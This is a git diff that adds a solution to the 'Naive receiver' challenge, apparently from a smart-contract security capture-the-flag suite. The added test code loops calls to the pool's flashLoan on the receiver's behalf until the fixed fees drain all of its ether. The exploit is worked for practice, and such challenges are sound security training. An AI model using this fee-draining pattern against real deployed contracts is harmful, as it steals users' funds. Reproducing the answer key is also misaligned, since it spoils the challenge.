@@ -38,6 +38,13 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Triggering the onFlashLoan function on the receiver we can take the ether as fee on every call
+        let ETHAddress = pool.ETH();
+        let balance = await ethers.provider.getBalance(receiver.address);
+        while (balance > 0) {
+            await pool.flashLoan(receiver.address, ETHAddress, 10, "0x");
+            balance = await ethers.provider.getBalance(receiver.address);
+        }
     });
 
     after(async function () {
